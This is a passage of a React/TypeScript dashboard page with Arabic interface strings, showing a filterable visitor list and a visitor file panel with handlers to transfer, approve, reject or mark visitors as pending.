                  <svg className="w-5 h-5 text-[#4a5568]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>
                </div>
                <p className="text-[#4a5568] text-sm">{'\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c'}</p>
                <p className="text-[#3a4a5f] text-xs">
                  {normalizedSearch
                    ? '\u062c\u0631\u0651\u0628 \u062a\u0639\u062f\u064a\u0644 \u0643\u0644\u0645\u0627\u062a \u0627\u0644\u0628\u062d\u062b'
                    : filterStatus !== 'all'
                      ? '\u062c\u0631\u0628 \u062a\u063a\u064a\u064a\u0631 \u0627\u0644\u0641\u0644\u062a\u0631'
                      : '\u0641\u064a \u0627\u0646\u062a\u0638\u0627\u0631 \u062f\u062e\u0648\u0644 \u0632\u0648\u0627\u0631 \u0645\u0646 \u0627\u0644\u0645\u0648\u0642\u0639'}
                </p>
                {(normalizedSearch || filterStatus !== 'all') && (
                  <button
                    type="button"
                    onClick={() => { setSearchQuery(''); setFilterStatus('all'); setSelectedId(null); }}
                    className="text-xs text-[#4A7FFF] hover:text-[#7ea3ff] transition-colors"
                  >
                    {'\u0645\u0633\u062d \u0627\u0644\u0628\u062d\u062b \u0648\u0627\u0644\u0641\u0644\u0627\u062a\u0631'}
                  </button>
                )}
              </div>
            ) : (
              filteredVisitors.map(v => {
                const ri = idToIndexMap.get(v.id) ?? -1;
                return (<CaseRow key={v.id} visitor={v} realIndex={ri} isSelected={selectedId === v.id} onClick={() => setSelectedId(v.id)} />);
              })
            )}
          </div>
        </div>

        {/* Left main: visitor file panel */}
        <div className="flex-1 bg-[#131c2b] overflow-hidden">
          {(selectedVisitor && realIndex >= 0)
            ? <VisitorFilePanel
                visitor={selectedVisitor}
                realIndex={realIndex}
                onTransfer={async (id, step) => { await transferVisitor(id, step); play('transfer'); }}
                onApprove={async (id) => { await completeVisitor(id); play('approval'); }}
                onReject={async (id) => { await rejectVisitor(id); play('rejection'); }}
                onPending={async (id) => { await setVisitorPending(id); play('alert'); }}
                onRemove={handleRemove}
              />
            : <NoFileSelected />}
        </div>
      </div>
    </div>
  );
}

export default function DashboardPage() {
  return (<DashboardGuard><DashboardContent /></DashboardGuard>);
}
